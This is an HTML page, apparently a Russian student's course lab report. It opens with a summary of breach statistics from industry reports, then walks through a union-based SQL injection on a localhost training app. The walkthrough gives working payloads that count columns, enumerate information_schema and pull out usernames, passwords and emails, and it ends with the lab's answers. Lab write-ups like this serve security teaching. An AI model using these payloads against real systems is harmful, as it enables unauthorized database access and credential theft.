@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h2>1 часть</h2>
+<ol>
+<li><p><a href="https://jre-training.com/WebSecurity/2024-DBIR-Summary.pdf">https://jre-training.com/WebSecurity/2024-DBIR-Summary.pdf</a> - глобальная статистика реальных инцидентов и утечек
+В статье мы можем увидеть, что было проанализировано 30458 реальных инцидентов. Из них получили 10626 подтвержденных утечек данных, жертвы из 94 стран мира
+Из основных векторов атак стали
+    а) Украденные учетные данные - самый распространенный вектор атаки
+    б) Фишинг
+    в) Эксплуатация уязвимостей - рост на 180 процентов по сравнению с 2023 годом, утроение. Главная причина - это атаки через MOVEit и другие zero-day. Основной вектор входа именно веб-приложения</p>
+</li>
+<li><p><a href="https://www.enisa.europa.eu/sites/default/files/2025-11/ENISA%20Threat%20Landscape%202025.pdf">https://www.enisa.europa.eu/sites/default/files/2025-11/ENISA%20Threat%20Landscape%202025.pdf</a> - доля успешных атак/проникновений через эксплуатацию веб-уязвимостей
+Было проанализировано и обработано около 4875 инцидентов, данные актуальны на июль 2024 - июнь 2025.
+В отчёте показывается, что эксплуатация уязвимостей - это одно из основных векторов начального проникновения: 21,3%. Для сравнения, фишинг - около 60%, ботнеты - 9,9%, вредоносные приложения - 8%, инсайдерские угрозы - 0,8%.
+Хоть фишинг и является самым распространенным атаки, эксплуатация уязвимостей демонстрирует гораздо более высокую &quot;эффективность&quot; с точки зрения достижения целей злоумышленников. 
+Почти 70% случаев эксплуатации уязвимостей приводят к успешному вторжению (по сравнению с 27% у фишинга). А также в 68% случаев эксплуатация уязвимостей приводит к загрузке вредоносного кода.</p>
+</li>
+<li><p><a href="https://ptsecurity.com/research/analytics/results-of-pentests-2023/#id1">https://ptsecurity.com/research/analytics/results-of-pentests-2023/#id1</a>
+Было проанализировано 28 проектов, 39% входят в рейтинг крупнейших компаний в России. 
+В 96% проектов организации оказались не защищены от проникновения во внутреннюю сеть. 
+В 100% внутренних пентестов удалось получить полный контроль над доменом. 
+В 63% организаций злоумышленник с даже низкой квалификацией сможет проникнуть в ЛВС извне.
+Также в ходе внешних пентестов было найдено 37 уязвимостей в веб-приложениях заказчиков. Из них 15 имели критический или высокий уровень опасности
+SQL-инъекция: cамая часто встречающаяся и опасная категория. Половина этих уязвимостей получила критический уровень опасности</p>
+</li>
+<li><p><a href="https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf?hsLang=en">https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf?hsLang=en</a> - распределение по конкретным уязвимостям</p>
+</li>
+</ol>
+<p>Источник отображает, что на уровне web application &amp; API 14.8% обнаруженных уязвимостей были критичные или высокого уровня опасности. </p>
+<p>Также в статье указан топ угроз. Мы можем увидеть долю от всех критичных и высоких уязвимостей, найденных в веб приложениях и API. Из статистики видно, что SQL инъекция 2 год подряд является наиболее популярной и опасной уязвимостью (28.88%)</p>
+<p>Также еще стоит отметить Malicious File Upload уязвимость, доля которой составляет 13.56%
+Cross-Site Scripting (XSS) - Stored (10.80%), Cross-Site Scripting (XSS) - Reflected (6.21%), API Accessible without Authentication (5.06%) и другие уязвимости</p>
+<h2>2 часть</h2>
+<ol>
+<li>Попадаю на страничку, накатываю данные для бд</li>
+<li>Через query параметры смотрю первый id, получаю следующие данные
+Команда - <code>http://localhost:8080/task/?id=1</code></li>
+</ol>
+<pre><code>Ваш id:1  
+Ваш логин:admin
+</code></pre>
+<ol start="3">
+<li><p>Далее бинарным поиском нахожу сколько у нас id в принципе
+ Их оказалось 9 штук
+ На 10 id просто пустая страница без ошибки, значит валидации ошибок нет</p>
+</li>
+<li><p>Простейшим способом проверим на sql инъекцию
+<code>http://localhost:8080/task/?id=1&#39;</code></p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>Значит тут можно сделать sql инъекцию</p>
+</li>
+<li><p>Ну ок, нам нужно определить данные для каких то пользователей, тут идеально подходит классическая Union Select SQL инъекция. Для этого сначала нужно определить количество столбцов (<a href="https://habr.com/ru/companies/pentestit/articles/542190/">https://habr.com/ru/companies/pentestit/articles/542190/</a>). Есть 3 метода</p>
+</li>
+</ol>
+<pre><code>?id=1&#39; union select null --
+</code></pre>
+<pre><code>?id=1&#39; order by 20 --
+</code></pre>
+<pre><code>?id=1&#39; group by 5 --
+</code></pre>
+<p>Я решил определить через group by
+6) Перебираем все варианты, пока не будет ошибки</p>
+<pre><code>http://localhost:8080/task/?id=1&#39; GROUP BY 1--+
+</code></pre>
+<p>Для 1 - сработало
+Для 2 - сработало
+Для 3 - сработало
+Для 4 - не сработало, значит всего у нас 3 столбца</p>
+<pre><code>Unknown column &#39;4&#39; in &#39;group statement&#39;
+</code></pre>
+<ol start="7">
+<li>Определим какие столбцы у нас показываются на странице</li>
+</ol>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,2,3--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:2
+</code></pre>
+<p>Значит выводятся только 1 и 2 столбцы
+8) Так, сейчас узнаем информацию о таблицах в бд.
+Опять пошел поресерчил в интернете как это сделать, есть разные способы, но я возьму перебор таблиц через LIMIT</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--+
+</code></pre>
+<p>Выводим нам</p>
+<pre><code>Ваш id:1  
+Ваш логин:emails
+</code></pre>
+<p>Далее меняем LIMIT на 1,1</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--+
+</code></pre>
+<p>Выводит</p>
+<pre><code>Ваш id:1  
+Ваш логин:users
+</code></pre>
+<p>Далее</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1--+
+</code></pre>
+<p>Выдает уже пустую страницу, значит у нас всего 2 таблицы - emails, users
+9) Также ради прикола узнаем, как называется бд</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,database(),3--+```
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:security
+</code></pre>
+<p>Имя бд - security
+А еще узнаем какие бд вообще есть у нас</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:information_schema,mysql,performance_schema,security,sys
+</code></pre>
+<p>Ничего интересного:</p>
+<ul>
+<li><code>information_schema</code> - системная, структура БД</li>
+<li><code>mysql</code> - системная, настройки MySQL</li>
+<li><code>performance_schema</code> - системная, метрики</li>
+<li><code>sys</code> - системная</li>
+<li><strong><code>security</code></strong> - как раз наша</li>
+</ul>
+<ol start="8">
+<li>Так, определим какие столбцы в таблице users и email есть</li>
+</ol>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=&#39;users&#39;--+
+</code></pre>
+<p>Тут кстати тоже через LIMIT можно аналогично сделать</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT 0,1--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+</code></pre>
+<p>И email, но тут ничего интересного, просто email и id</p>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=&#39;emails&#39;--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:id,email_id
+</code></pre>
+<ol start="9">
+<li>Так, теперь мы знаем имена всех таблиц, db, столбцов</li>
+</ol>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,username,3 FROM users LIMIT 0,1--+
+</code></pre>
+<p>Где 1,3 - это просто заглушки
+Отлично, мы получили просто username 1 юзера</p>
+<pre><code>Ваш id:1  
+Ваш логин:admin
+</code></pre>
+<p>Определим его пароль</p>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,password,3 FROM users LIMIT 0,1--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:kjhsd8@j0dfjk3$%jksli
+</code></pre>
+<p>Ну и по сути все, сейчас просто находим id нужных пользователей и через команду выше, меняя limit находим их пароли/почты</p>
+<p>Перебирая id найден нужных пользаков
+Определим нужные
+Для Vinni-pukh почта</p>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,email_id,3 FROM emails LIMIT 3,1--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:honey_lover@otus-lab.com
+</code></pre>
+<p>Ответ на первое задание: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>
+Пароль для пользователя Vinni-pukh: Ya tu4ka-tu4ka-tu4ka (использовал ту же команду, просто другую таблицу и вместо email_id написал password)</p>
+<p>с Volk2 аналогично</p>
+<pre><code>http://localhost:8080/task/?id=mojarung&#39; UNION SELECT 1,password,3 FROM users LIMIT 8,1--+
+</code></pre>
+<pre><code>Ваш id:1  
+Ваш логин:Wa spoiuuuuu
+</code></pre>
+<p>Ответ на 2 задание: Wa spoiuuuuu</p>
+<h4>Ответы</h4>
+<p>Первое задание: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>
+Второе задание: Wa spoiuuuuu</p>
+
+</body>
+</html>
